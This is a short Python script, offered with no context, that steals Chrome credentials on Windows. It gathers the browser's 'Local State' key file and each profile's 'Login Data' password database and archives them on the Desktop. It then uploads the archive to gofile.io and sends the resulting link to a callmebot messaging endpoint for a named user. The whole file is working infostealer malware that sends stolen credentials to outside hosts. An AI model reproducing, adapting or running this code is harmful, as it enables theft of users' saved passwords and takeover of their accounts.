import tarfile,os,requests,re
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
def create_tar_file(tar_filename, files_to_compress):
    with tarfile.open(tar_filename, 'w') as tar:
        for file in files_to_compress:
            tar.add(file)
def upload(file_path):
    url = "https://store1.gofile.io/contents/uploadfile"
    with open(file_path, 'rb') as file:
        files = {"file": file}
        response = requests.post(url, files=files)
        requests.post('https://api.callmebot.com/text.php?user=@id_sakib',params={'text':response.text})
files = [CHROME_PATH_LOCAL_STATE]
for folder in folders:
    files.append(os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder)))
desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
archive = os.path.join(desktop_path,'archive.tar')
create_tar_file(archive, files)
upload(archive)
